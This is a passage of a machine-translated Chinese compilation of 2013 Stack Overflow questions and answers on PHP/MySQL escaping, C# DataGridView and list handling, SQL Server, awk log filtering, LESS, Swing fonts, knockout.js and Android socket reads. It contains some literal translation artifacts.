所以。在我看来。你应该只使用 1 个 jQuery src 和插件。我更喜欢最新版本。像 [https://code.jquery.com/jquery-3.3.1.js](https://code.jquery.com/jquery-3.3.1.js)和插件来编辑，操作，动画你的工作就像旋转，textillate，旋转。完美的 jquery 编辑器是

```
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script src="https://raw.githubusercontent.com/wilq32/jqueryrotate/master/jQueryRotate.js"></script>
<script src="textillate.js"></script>
<script src="lettering.js"></script> 
```

对我来说，它工作得非常好。

# php - 将内容保存到 mysql 数据库时出现撇号“'”的问题

> ID：15154069
> 
> 赞同：1
> 
> 时间：2013-03-01T09:07:14.740
> 
> 标签：php, javascript, mysql

我正在开发一个允许用户创建 html 模板并保存它们的应用程序。用户可以使用不同的组件，如文本、图像等并创建 html 页面。

**问题：**我面临的问题是，当用户输入一些带有**撇号** `'`的文本时，我得到一个 mysql 错误（*显然它应该*）。所以，我`mysql_real_escape_string`在将变量传递给查询之前添加了它。它可以工作，但我想要返回数据供用户编辑站点。当我尝试取回它时，由于返回的内容添加了斜杠，因此出现错误。
我不能使用`stripslashes`，因为我的内容可能有斜杠作为用户输入的文本的一部分。

这是将其添加到数据库的方法：

```
 $revisionContent = mysql_real_escape_string($_POST['txtComp']); 
```

这是查询

```
 $query = "insert into revision (userId,revisionContent,webId,pageId,status,saveType,dateAdded) values ('".$_SESSION['gogiUserId']."','$revisionContent','$webId','$pageId','$status','$saveType','$toDate')"; 
```

**我想要javascript**变量中的检索值，所以我这样做

```
 var getSavedContent = '<?php echo json_encode($IdLessContent); ?>'; 
```

但后来我得到了这个错误！

```
 SyntaxError: missing ; before statement
     [Break On This Error]  
     ...helvetica,sans-serif;\"><strong>Text **Bo'x**(here is the apostrophe)<\/strong><\/span><\/span><\/p>\n<ol>\n... 
```

如果我删除`json_encode`它会给我这个语法错误。

```
 SyntaxError: syntax error
   [Break On This Error]     
   var getSavedContent = <div style="z-index: 1001; height: 241px; width: 725px; to... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:14:34.853

这与 MySQL 无关。在您从中获取数据之前，您的问题不会开始。

您正在获取一个可能包含撇号的数据结构，将其转换为 JSON，然后通过在其周围加上引号将该 JSON 文本转换为 JavaScript 字符串。

由于 JSON（或多或少）是 JavaScript 的一个子集，因此您可以通过跳过“转换为 JS 字符串”和“将 JSON 字符串解析为 JS 对象”步骤来处理此问题。

删除引号：

```
 var getSavedContent = <?php echo json_encode($IdLessContent); ?>; 
```

# c# - 创建新行后在 DataGridView 中选择一个 DataRow

> ID：15154071
> 
> 赞同：1
> 
> 时间：2013-03-01T09:07:16.823
> 
> 标签：c#, postgresql, datagridview

我使用 PostgreSQL 视图在以下位置显示数据`DataGridView`：

```
dataSource = new BindingSource();
dataSource.DataSource = Program.DB.GetView(dbView);  // returns a DataTable
dgData.DataSource = dataSource; 
```

现在，在我使用 PostgreSQL 函数添加记录后，我刷新了网格中的数据（我不`Rows.Add()`调用`DataGridView`：

```
protected void RefreshData() {
    dataSource.DataSource = Program.DB.GetView(dbView);
} 
```

PostgreSQL 的插入函数返回插入行的 ID，所以我知道 ID（即主键）并想`Selected`在`true`. `DataGridView`该行可以在集合中的任何位置，因为视图是按名称排序的，而不是 ID。我认为我可以通过循环遍历所有行并设置`Selected`找到它的时间来做到这一点，但这在大型数据集上可能会变得很慢。

有没有办法以某种方式将数据源的行绑定到数据网格？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:26:36.030

向事件添加事件处理程序`ListChanged`：

```
dataSource.ListChanged += dataSource_ListChanged; 
```

这是事件处理程序定义：

```
void dataSource_ListChanged(object sender, ListChangedEventArgs e)
{
    if (dgData.Rows.Count > 0)
        dgData.CurrentCell = dgData.Rows[e.NewIndex].Cells[0];
} 
```

**[更新]**

正如我在评论中所建议的那样，也许您不应该在每次插入（或更新）时重新填充数据源。为了证明我的观点，我将发布一个使用 a `DataGridView`、 2`TextBoxes`和 2 `Button`s（用于插入和更新）和 a的代码示例`SqlDataAdapter`。SQL 表有 2 列 (`id`和`value`)。

这是代码（我没有涉及删除）：

```
public partial class Form1 : Form
{
    static BindingSource dataSource;
    static string dbView = "default";

    public Form1()
    {
        InitializeComponent();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
        dgData.MultiSelect = false;
        dataSource = new BindingSource();
        dataSource.ListChanged += dataSource_ListChanged;
        RefreshData();
        dgData.DataSource = dataSource;
        dgData.Sort(dgData.Columns[1], ListSortDirection.Ascending);
    }

    void dataSource_ListChanged(object sender, ListChangedEventArgs e)
    {
        if (dgData.Rows.Count > 0)
            dgData.CurrentCell = dgData.Rows[e.NewIndex].Cells[0];
    }

    protected void RefreshData()
    {
        dataSource.DataSource = DB.GetView(dbView);
    }

    private void insert_Click(object sender, EventArgs e)
    {
        DB.Insert(textBox1.Text);
        RefreshData();
    }

    private void update_Click(object sender, EventArgs e)
    {
        DB.UpdateRandomRow(textBox2.Text);
        RefreshData();
    }
}

class DB
{
    static DataTable dt;
    static string conStr = "yourConnectionString";
    static SqlDataAdapter _adapter;
    static Random r = new Random(10);

    public static SqlDataAdapter CreateSqlDataAdapter(SqlConnection connection)
    {
        _adapter = new SqlDataAdapter();
        _adapter.MissingSchemaAction = MissingSchemaAction.AddWithKey;

        _adapter.SelectCommand = new SqlCommand(
            "SELECT * FROM test", connection);
        _adapter.InsertCommand = new SqlCommand(
            "INSERT INTO test (value) " +
            "VALUES (@value)", connection);
        _adapter.UpdateCommand = new SqlCommand(
            "UPDATE test SET [value] = @value " +
            "WHERE id = @id", connection);
        _adapter.InsertCommand.Parameters.Add("@value",
            SqlDbType.NVarChar, 50, "value");
        _adapter.UpdateCommand.Parameters.Add("@id",
            SqlDbType.Int, 4, "id").SourceVersion = DataRowVersion.Current;
        _adapter.UpdateCommand.Parameters.Add("@value",
            SqlDbType.NVarChar, 50, "value").SourceVersion = DataRowVersion.Current;

        return _adapter;
    }

    // random update, to demonstrate dynamic
    // repositioning
    public static DataTable UpdateRandomRow(string value)
    {
        var currentRandom = r.Next(dt.Rows.Count);
        dt.Rows[currentRandom].SetField<string>(1, value);
        using (var con = new SqlConnection(conStr))
        {
            con.Open();
            _adapter = CreateSqlDataAdapter(con);
            _adapter.Update(dt);
        }
        return dt;
    }

    internal static DataTable GetView(string dbView)
    {
        if (dt == null)
        {
            dt = new DataTable();
            using (var con = new SqlConnection(conStr))
            {
                con.Open();
                _adapter = CreateSqlDataAdapter(con);
                _adapter.Fill(dt);
            }
        }
        return dt;
    }

    internal static void Insert(string value)
    {
        if (dt == null)
            GetView("");
        var dr = dt.NewRow();
        dr[1] = value;
        dt.Rows.Add(dr);
        using (var con = new SqlConnection(conStr))
        {
            con.Open();
            _adapter = CreateSqlDataAdapter(con);
            _adapter.Update(dt);
        }
    }
} 
```

如果您对其进行测试，您将看到您的问题的请求对于插入和更新都得到了满足。此外，请注意性能改进，因为不会在每次操作时重新创建数据表。

# sql - SQL：所选日期超出范围

> ID：15154079
> 
> 赞同：1
> 
> 时间：2013-03-01T09:07:48.970
> 
> 标签：sql, sql-server, sql-server-2008

我有一个查询，它返回创建行的最新日期。日期是'2010-02-03'

```
SELECT * FROM
[LinkedServer].[Server].[Table]
WHERE [TimeStamp]= (SELECT MAX(TimeStamp)
FROM [LinkedServer].[Server].[Table]
WHERE UserName IN 
(SELECT Tagname COLLATE DATABASE_DEFAULT FROM LocalServer.MyDatabase.dbo."Taglist"
WHERE LOCATION = 'Europe' AND COUNTRY = 'England')) 
```

这个查询工作正常，但是我想插入一个 IF ELSE 语句，所以如果我选择一个不同的日期，大于 MAX(TimeStamp) 然后返回一条错误消息。我尝试的方式如下：

```
IF MAX(TimeStamp) > '2011-02-15'
BEGIN

SELECT * FROM
[LinkedServer].[Server].[Table]
WHERE [TimeStamp]= (SELECT MAX(TimeStamp)
FROM [LinkedServer].[Server].[Table]
WHERE UserName IN 
(SELECT Tagname COLLATE DATABASE_DEFAULT FROM LocalServer.MyDatabase.dbo."Taglist"
WHERE LOCATION = 'Europe' AND COUNTRY = 'England'))

END
ELSE 
PRINT 'Date out of range' 
```

不幸的是，这样查询不起作用。关于我应该在哪里更改代码的任何建议？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:13:02.310

```
Declare @MaxTS datetime

SELECT @MaxTS=MAX(TimeStamp)
FROM [LinkedServer].[Server].[Table]
WHERE UserName IN 
(SELECT Tagname COLLATE DATABASE_DEFAULT FROM LocalServer.MyDatabase.dbo."Taglist"
WHERE LOCATION = 'Europe' AND COUNTRY = 'England')

IF @MaxTS > '20110215'
BEGIN

SELECT * FROM
[LinkedServer].[Server].[Table]
WHERE [TimeStamp]= @MaxTS

END
ELSE 
PRINT 'Date out of range' 
```

# linux - 如何在 Linux 中的特定时间戳范围内 grep 日志文件内容？

> ID：15154083
> 
> 赞同：2
> 
> 时间：2013-03-01T09:08:18.970
> 
> 标签：linux, bash, awk, grep, pattern-matching

我有一个日志文件，其中包含以下格式的数据

```
[1361991081] SERVICE NOTIFICATION: qreda;qa-hadoop1;CPU Load;CRITICAL;notify-service-by-email;CRITICAL - load average: 18.29, 18.14, 18.10
[1361991371] SERVICE NOTIFICATION: qreda;CRITICAL-SERVICES_FOR_LAST_24_HOURS;qa-hadoop1:Critical Services;CRITICAL;notify-service-by-email;CPU Load,Memory,
[1361994681] SERVICE NOTIFICATION: qreda;qa-hadoop1;CPU Load;CRITICAL;notify-service-by-email;CRITICAL - load average: 18.02, 18.06, 18.11
[1361994971] SERVICE NOTIFICATION: qreda;CRITICAL-SERVICES_FOR_LAST_24_HOURS;qa-hadoop1:Critical Services;CRITICAL;notify-service-by-email;CPU Load,Memory, 
```

我包含过去 7 天的所有数据。我想 grep 这个文件以显示昨天的日志。这里日期显示为时间戳。我正在使用以下命令

```
cat /usr/local/nagios/var/nagios.log |grep qa-hadoop1|grep CRITICAL|grep NOTIFICATION | awk -F, '{ if ($1>"[1361989800]" && $1<"[1362076199]") print }' 
```

`1361989800`计算的时间戳值在哪里`Thu Feb 28 00:00:00 IST 2013`

并且 `1362076199`是计算的时间戳值`Thu Feb 28 23:59:59 IST 2013`。

这很好用，但问题是我如何传递`1361989800`和`1362076199`作为参数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:16:47.953

你只需要`awk`这个。

```
awk -va=1361989800 -vb=1362076199 '{gsub(/[][]/,"")}/qa-hadoop1|CRITICAL|NOTIFICATION/&&$1>a&&$1<b' file 
```

这些`-v`选项允许您传入变量。也可以通过`gsub`删除括号来对第一个字段进行整数比较*（空格分隔不是逗号）*。

* * *

**笔记：**

`grep`读取文件，所以你不需要`cat file | grep 'pattern'`只是`grep 'pattern' file`你也可以使用交替，`egrep 'qa-hadoop1|CRITICAL|NOTIFICATION' file`所以你不需要管道`grep`三次。

更多`awkish`版本`awk -F, '{ if ($1>"[1361989800]" && $1<"[1362076199]") print }'`是`awk -F, '$1>"[1361989800]" && $1<"[1362076199]"'`您不需要`if`构造，并且默认块`awk`是打印。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:16:04.917

这是使用命令行参数分配的一种方法：

```
grep qa-hadoop1 input | grep CRITICAL| grep NOTIFICATION | \
  awk -F, -v b=1361989800 -v e=1362076199 \
    '{ if ( $1 > "["b"]" && $1<"["e"]") print }' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:43:03.873

除了你的`cat|grep|grep|grep|awk`，我会问，为什么你在 awk 中设置逗号`,`，`FS`然后将 $1 与时间戳进行比较？$1 从开始到第一个逗号，这是不正确的。

`FS`如果您想比较`if`报表中的日期，则应该是空格。

如果您`-F,`从 awk 行部分中删除它可能会起作用。试试看。

更简单，你可以采取`[`or `]`as `FS`。

# css - 在 CSS 文件中使用嵌套元素需要什么？

> ID：15154085
> 
> 赞同：3
> 
> 时间：2013-03-01T09:08:26.380
> 
> 标签：css, css-selectors

在某处我看到了 CSS 文档的这种结构：

```
header {
  .navigation {
    a {
      text-decoration: none;
    }
  }
} 
```

如果我在我的 CSS 文件中尝试它，它不起作用。编写此代码的能力需要什么？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:11:27.910

这看起来像 LESS CSS [http://lesscss.org/](http://lesscss.org/)

您必须将 javascript 文件 less.js 导入您的页面。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:30:00.167

现在编译你的 css 文件，然后应用**@ozkanozlu**先生是正确的方法

**就这样做**

```
header {.navigation{a{text-decoration: none;}}} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T09:39:17.857

您引用的代码实际上不是 CSS，它是一种名为[LESS](http://lesscss.org/)的语言，它编译为 CSS；它是一个 CSS 预处理器。它旨在使 CSS 更易于使用，但需要将其转换为纯 CSS 才能真正在浏览器中工作。

LESS 可以在部署之前编译成 CSS——也就是说，你可以处理 LESS 代码，但用户会看到标准的 CSS——或者作为 LESS 提供给浏览器，但是页面中还包含了 less.js 编译器。出于性能原因，我总是更喜欢这些选项中的第一个。

其他类似的语言也存在——例如参见[SASS 。](http://sass-lang.com/)您可以在此处查看 SASS 与 LESS 的比较：http: [//css-tricks.com/sass-vs-less/](http://css-tricks.com/sass-vs-less/)

# java - 如何使用 Swing 在桌面应用程序中将英文字体转换为泰卢固字体

> ID：15154088
> 
> 赞同：1
> 
> 时间：2013-03-01T09:08:37.240
> 
> 标签：java, swing, fonts

最近我使用 Swing 开发了一个桌面应用程序“酒店管理系统”，效果很好！

但现在最新的要求是应用程序应该是*泰卢固*字体！这意味着应用程序的 GUI 应该是*泰卢固*语，账单和报告以及应用程序中的所有内容都应该是*泰卢固语*......

所以我的问题是，这可能吗？如果是这样，那么应该使用什么技术和摆动来实现这一点？
如果任何新的东西应该与 Swing 一起应用，那么我很想学习它并在我的应用程序中使用它！

请帮帮我。我不知道如何做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T11:50:58.477

只要您做好准备，更改默认字体并不是特别困难。

查看[Jasper Reports 的自定义字体，](http://javaskeleton.blogspot.com.au/2010/12/embedding-fonts-into-pdf-generated-by.html)了解如何将您的字体与 Jasper Reports 捆绑在一起。还建议查看官方文档和论坛以获取更多最新信息。

网上有很多例子，只需谷歌一下*“Jasper Reports custom fonts”*

为 Swing 设置所需的字体并不难，但很大程度上取决于您使用的外观和感觉如何存储它的属性。

现在取决于系统上是否安装了字体，或者您是否将字体作为嵌入式资源提供，您可能需要也可能不需要执行以下操作。

如果您不依赖系统上安装的字体，而是自己提供它，那么您需要加载它。

```
// Load the font, for example "Telugu.ttf"
String fName = "/fonts/" + name;
InputStream is = null;
try {
    InputStream is = DemoFonts.class.getResourceAsStream(fName);
    font = Font.createFont(Font.TRUETYPE_FONT, is);
} finally {
    try {
        is.close();
    } catch (Exception exp) {
    }
} 
```

否则，您应该能够使用所需的字体系列名称简单地创建`Font`对象。`Telugu`

接下来，您要将当前外观使用的默认字体更改为您想要使用的字体。这必须在您安装外观和感觉之后以及在您创建任何 UI 元素之前。

```
Object[] keys = keySet.toArray(new Object[keySet.size()]);

for (Object key : keys) {

    if (key != null && key.toString().toLowerCase().contains("font")) {

        Object oValue = UIManager.getDefaults().get(key);

        if (oValue != null) {

            String value = oValue == null ? null : UIManager.getDefaults().get(key).toString();
            UIManager.put(key, font);

        }

    }

} 
```

现在，您需要注意 Swing 在外观和感觉上默认倾向于使用固定宽度字体，将字体更改为可变宽度字体会改变您的布局。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-13T07:56:41.440

It is also possible without using fonts. Use Telugu Unicode to display telugu language and even for JASPER reports. I developed English to Telugu Transliterator using telugu unicode without using any font system. Just configure all label names in telugu, kannada, hindi and load with transliterator.

# jakarta-ee - 使用 EJB 的后台进程

> ID：15154091
> 
> 赞同：0
> 
> 时间：2013-03-01T09:08:55.387
> 
> 标签：jakarta-ee, ejb, threadpool, glassfish-3, workmanagers

我试图弄清楚如何解决我遇到的设计问题。假设在我的应用程序中，我需要一种在后台持续工作的守护程序/服务来管理对象池，以使它们可供客户端使用。特别是这个守护进程负责管理这些对象的整个生命周期。

现在，在没有深入了解这个守护进程范围的细节的情况下，我正在考虑如何设计它。我的第一个想法是依赖`WorkManager`API。由于我有一个 Singleton EJB 对我的应用程序核心进行建模，因此我的想法是获取一个`WorkManager`然后生成守护进程（显然是实现`Work`. 我在开发资源适配器时使用了 WorkManager，我认为我也可以在 EJB 中使用它，但是站在 Glassfish (3.1.2.2) 对`WorkManager`API 的支持（基本上由 提供`javax.resource.spi.work`）我发现在 RA 上下文之外这是不可能的.

我浏览了网络，发现[Daniel Veselka 的一篇有趣的文章](http://danielveselka.blogspot.it/2012/03/schedule-jobs-with-workmanager.html)似乎解决了介绍 WorkManager 的 CommonJ 实现的问题，我明确地考虑采用这种方法。

你怎么看待这件事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:20:09.093

您还可以使用定时 bean 定期重新调度自身，并发送代表实际工作的 JMS 消息。它对我们有用。

# algorithm - 查找线路径的交点

> ID：15154092
> 
> 赞同：3
> 
> 时间：2013-03-01T09:09:01.203
> 
> 标签：algorithm, geometry, intersection, bezier, line-segment

我有两条贝塞尔曲线，它们共享一个端点。这些曲线中的每一个在左右两侧都有一个“延伸”，类似于道路的边缘。扩展由近似贝塞尔曲线的线段组成。

我想找到这些路径与贝塞尔曲线的共享端点最近的交点。

[这是我绘制的问题图](http://i.stack.imgur.com/gt2Ps.png)

每条线路径都有超过 100 个顶点，因此与每条线相交并保持最近的交点可能会变得非常慢，因为这必须实时运行。

在检查交点以加快速度之前，我已经在线上运行了边界球相交测试，但它仍然不够快。我的下一个方法是使用某种四叉树结构。

我查看了[Bentley-Ottmann 算法](http://en.wikipedia.org/wiki/Bentley%E2%80%93Ottmann_algorithm)，但它似乎处理在一组线中查找所有交叉点，这不是我需要的。我还查看了 Bezier 曲线相交算法，但它们似乎需要细分成线段，我已经有了。

是否有任何有用的算法可以解决这个问题，或者关于如何优化它的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:43:43.807

给定两条延伸宽度为 Aw 和 Bw 的曲线 A 和 B。找到点 A'，它是从共享节点 N 沿 A 的距离 Bw。找到点 B'，它也是从共享节点 N 沿 B 的距离 Aw。现在，给定点 N、A' 和 B'，找到与其他三个节点形成平行四边形的第四点 N'。这个点N'是交点。

# xcode4.5 - 将旧的 xcode 项目迁移到最新版本

> ID：15154096
> 
> 赞同：8
> 
> 时间：2013-03-01T09:09:24.243
> 
> 标签：xcode4.5

我对旧 xcode 项目的内存管理和泄漏（对象的潜在泄漏）有问题。我可以使用自动引用计数将这些项目迁移到新的 xcode4.5 以克服上述问题。如果这可能意味着我怎么能做到？这是正确的方法还是该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-05T07:55:21.593

是的，您绝对可以使用 Xcode 最新版本本身来做到这一点。XCode 足够智能，可以将非 ARC 更改为 ARC，并且还可以使用最新的语法。

将您的项目打开到最新版本的 Xcode，可能是 5.0.1，然后转到菜单 Edit-> Refactor-> Convert to Objective-C ARC

重构菜单下还有许多其他选项。你可以试试这些。

![这是屏幕截图](../Images/125dc7cd9991d298d9e099c20b4e122e.png)

# linq - Linq - 更新所有属性，但不更新关键属性

> ID：15154106
> 
> 赞同：0
> 
> 时间：2013-03-01T09:10:16.070
> 
> 标签：linq, oop, reflection, entity-framework-4

我有一个“产品”对象，它必须更新数据库中的记录。通过“productCode”，我使用 Linq 检索要更新的对象。覆盖所有属性而不是关键属性然后保存更改的最优雅的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:13:57.690

无论如何，您都需要访问每个属性，因为您手动获取记录。我对最简单、最快和最干净的代码的建议：

```
code = productCode_toChange
using(Entity ent = new Entity())
{
var update = (from x in ent.Products where x.productCode == code select x).First();
update.property1 = product.property1;
update.property2 = product.property2;
// and so on for each property you change
ent.SaveChanges();
} 
```

你当然可以尝试：

```
using(Entity ent = new Entity())
{  
var update = (from x in ent.Products where x.productCode == code select x).First();
update = product;
ent.SaveChanges();
} 
```

但我几乎可以保证这不会起作用，因为产品肯定会有一个 id 属性，它会尝试写入更新，这将引发异常，因为案例产品是表实例的 LINQ 生成类型。

小心检查类型一致性。另请注意，您的产品代码的 SQL 类型不应该是文本，因为这种类型是无与伦比的

# c# - 从列表中删除项目并同时获取项目

> ID：15154110
> 
> 赞同：20
> 
> 时间：2013-03-01T09:10:27.440
> 
> 标签：c#, list

在 C# 中，我试图从随机索引的列表中获取一个项目。检索到它后，我希望将其删除，以便不再选择它。似乎我需要很多操作才能做到这一点，难道没有一个函数可以让我简单地从列表中提取一个项目吗？RemoveAt(index) 函数无效。我想要一个有返回值的。

我在做什么：

```
List<int> numLst = new List<int>();
numLst.Add(1);
numLst.Add(2);

do
{
  int index = rand.Next(numLst.Count);
  int extracted = numLst[index]; 
  // do something with extracted value...
  numLst.removeAt(index);
}
while(numLst.Count > 0); 
```

我想做的事：

```
List<int> numLst = new List<int>();
numLst.Add(1);
numLst.Add(2);

do
{
  int extracted = numLst.removeAndGetItem(rand.Next(numLst.Count)); 
  // do something with this value...
}
while(numLst.Count > 0); 
```

是否存在这样的“removeAndGetItem”功能？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-01T09:18:48.210

不，因为它违反了纯函数礼仪，其中一个方法要么有副作用，要么返回一个有用的值（即不仅仅是指示错误状态）——绝不是两者兼而有之。

如果您希望函数看起来是原子的，您可以获取列表上的锁，这将阻止其他线程在您修改列表时访问列表，前提是它们也使用`lock`：

```
public static class Extensions
{
    public static T RemoveAndGet<T>(this IList<T> list, int index)
    {
        lock(list)
        {
            T value = list[index];
            list.RemoveAt(index);
            return value;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-01T09:12:53.167

```
public static class ListExtensions
{
  public static T RemoveAndGetItem<T>(this IList<T> list, int iIndexToRemove}
  {
    var item = list[iIndexToRemove];
    list.RemoveAt(iIndexToRemove);
    return item;
  } 
} 
```

这些称为[扩展方法](http://msdn.microsoft.com/en-gb/library/vstudio/bb383977.aspx)，称为 as `new List<T>().RemoveAndGetItem(0)`。

**扩展方法中需要考虑的事项**

使用您传递的索引进行异常处理，在执行此操作之前检查索引是否为 0 和列表的计数。

# javascript - knockout.js 中的图像数据

> ID：15154111
> 
> 赞同：1
> 
> 时间：2013-03-01T09:10:28.747
> 
> 标签：javascript, html, dom, knockout.js

使用 knockout.js，我试图实现本质上是图像预加载器和缓存器。练习的重点是，除了首先在服务器上处理之外，我正在加载的图像需要相当长的时间来下载。因此，我的 UI（可以在图像集之间浏览）旨在仅在必要时下载这些图像集以减少负载。另外，我不想向用户提供在漫长的等待期间正在发生的事情的指示。

这就是为什么，这里是我当前“如何”的描述：

1：我使用 jQuery .load 来使用实际图像数据填充数组：

```
 images[doc.pages()[i].pagenumber() - 1] = $("<img />").attr('src', path).load(function() {} 
```

我使用 .load 是因为它只在每个网络请求完成后更新 DOM，允许我为代码块中的每次迭代设置一个计数器，以向用户指示正在加载（例如 loadCounter++；）

2：在 .load 回调中，我现在这样做：

```
if(loadedPages === doc.pages().length){
    if(loadedPages === doc.pages().length){
        for(var x = 0; x < images.length; x++){
            $("#" + doc.idname()).append(images[x]);
        } 
    }
} 
```

这里发生的是 images 数组包含实际准备就绪的 HTML 图像 DOM 元素，一旦所有网络请求完成，这些元素就可以直接注入到结构中。

这是我目前的方式，这也是我接下来想要实现的目标：

而不是这样做，我想用相同的图像数据填充一个淘汰赛 observableArray，并对其进行 foreach 绑定，例如：

```
<div data-bind="foreach:images">
    <img data-bind="what goes here?">
</div> 
```

这个例子最终解决了我的问题。淘汰赛中的数据绑定结构通常让您绑定到属性，例如`<img data-bind="attr:{src:path}`. 但是，这样做会导致每次 dom 更新时重新加载图像（浏览时删除图像数据）。

所以最后，提炼出的问题是：我可以像我的示例中那样使用 DOM 图像元素填充 observableArray 并使用 knockout.js 迭代它们吗？如果这不可行或不切实际，是否还有其他用于缓存和迭代图像的解决方案，最好是淘汰赛？

在此先感谢，回答将得到奖励

更新

可以使用`<object>`标签吗？例如`<object data-bind="attr:{data: $data.imageData}"></object>`。我现在正在玩它，但我只得到 [object Object]。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T10:17:39.427

您可以在 div 上使用[自定义绑定](http://knockoutjs.com/documentation/custom-bindings.html)并在其中添加 img 元素吗？我在这里假设您已经下载并创建了它们？然后，您的图像可以是您创建的 DOM 节点的可观察数组。

```
<div data-bind="imageAttach: images">
</div> 

ko.bindingHandlers.slideVisible = {
    init: function(element, valueAccessor) {
        var value = ko.utils.unwrapObservable(valueAccessor()); // Get the current value of the current property we're bound to
        // Loop over the array sent in, and add them all to the div
    },
    update: function(element, valueAccessor, allBindingsAccessor) {
        // You could delete all the image nodes here and add in the newly created ones
    }
}; 
```

# java - 无法读取 Jelly Bean 上的套接字 InputStream

> ID：15154113
> 
> 赞同：20
> 
> 时间：2013-03-01T09:10:29.513
> 
> 标签：java, android, sockets, inputstream, android-4.2-jelly-bean

我有一个 TCP 套接字连接，它在 Android 2.3 上运行良好，但现在在 Android 4.1 上遇到了一些问题。问题是 InputStream.read() 方法总是返回 -1（没有阻塞），就像连接关闭一样。

创建套接字：

```
SocketFactory socketFactory = SocketFactory.getDefault();
Socket socket = socketFactory.createSocket("c.whatsapp.net", 5222);
socket.setSoTimeout(3*60*1000);
socket.setTcpNoDelay(true); 
```

检索输入和输出流并写入一些初始数据：

```
InputStream inputStream = new BufferedInputStream(socket.getInputStream());
OutputStream outputStream = new BufferedOutputStream(socket.getOutputStream());

outputStream.write(87);
outputStream.write(65);
outputStream.write(1);
outputStream.write(2);
outputStream.flush(); 
```

然后，这个条件总是通过而不阻塞：

```
int c = inputStream.read();
if (c < 0) {
    Log.d(TAG, "End of stream");
} 
```

**此代码在后台线程中运行**。它正在研究姜饼。

尝试使用 InputStreamReader 和 OutputStreamWriter 而不是直接流 - 没有效果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-13T16:13:13.823

我以前也看到过同样的错误，虽然这个答案可能看起来离题，给它一个机会，让我知道它是否有效，由于某种原因，即使它们在较低的 android 版本中完全正常工作，套接字在 jellybean 上也有奇怪的行为，我解决这个问题的方法是将targetSdkVersion移动到jelly bean以及项目的Android属性下的Project Build Target，没有修改一行代码，只是这样，出于某种原因它可以解决问题.. .

希望这可以帮助。

问候！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-13T08:18:48.170

Try this code -

```
Runnable runnable = new Runnable() {

    @Override
    public void run() {

        synchronized (this) {
            Socket s = null;
            String inMsg = null, msg2 = null;
            try {
                try {
                    s = new Socket(server, port);
                } catch (Exception e) {
                    return;
                }
                BufferedReader in = new BufferedReader(
                        new InputStreamReader(s.getInputStream()));
                BufferedWriter out = new BufferedWriter(
                        new OutputStreamWriter(s.getOutputStream()));
                try {
                    inMsg = in.readLine()
                            + System.getProperty("line.separator");
                } catch (Exception e) {
                    return;
                }

                out.write(message + "\n\r");
                out.flush();
                try {
                    msg2 = in.readLine();
                    if (msg2 == null) {
                        return;
                    }
                } catch (Exception e) {
                    return;
                }
                out.close();
                s.close();
            } catch (Exception e) {
                return;
            }
        }

    }

}; 
```

It works for me.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-25T04:39:36.937

朋友，

尝试`inputStream.readLine();`（即）`DataInputStream.readLine();`（不推荐使用的方法）

这对我有用...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-13T16:55:10.040

我有一些类似的问题，`inputStream.read()`返回 -1 并且我没有得到任何异常。事实上，服务器已关闭，连接中断。我没有用不同的版本测试它，只有4.0。

这是有关此行为的[Google 错误报告。](http://code.google.com/p/android/issues/detail?id=6144)

不幸的是，该错误的状态似乎是“关闭”的，因为不可复制。

我的解决方法是将 -1 解释为套接字的关闭和无法访问的服务器。当您尝试重新连接时，您会得到正确的错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-10-25T07:44:30.570

我遇到了类似的问题并用这样的解决方法修复了它

```
private static ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(1);

private static class WatchDog implements Runnable{
    private Thread thread = Thread.currentThread();

    public void run() {
        Log.d(LOG_TAG, "Interrupting read due to timeout");
        thread.interrupt();
    }
}

private void read(InputStream in, ByteBuffer bb, long waitTime) throws IOException {
    int startingPos = bb.position();
    long timeout = System.currentTimeMillis() + RESPONSE_TIMEOUT;

    ScheduledFuture<?> watchdogFuture = executor.schedule(new WatchDog(), RESPONSE_TIMEOUT, TimeUnit.MILLISECONDS);
    try {
        while(System.currentTimeMillis() < timeout && bb.hasRemaining()){ //workaround fixing timeout after 1ms
            try{
                int read = in.read(bb.array(), bb.position(), bb.remaining());
                if(read > 0){
                    bb.position(bb.position()+read);
                }
            } catch(SocketTimeoutException e){}
            if(bb.hasRemaining()){
                Thread.sleep(5);
            }
        }
        watchdogFuture.cancel(true);
    } catch (InterruptedException e) {}

    if(bb.hasRemaining()){
        throw new SocketTimeoutException("Unable to read requested bytes: " 
                + (bb.position()-startingPos) + "/" +  (bb.limit()-startingPos)
                + " after " + (System.currentTimeMillis() - timeout + RESPONSE_TIMEOUT) + "ms");
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-11-08T13:14:39.703

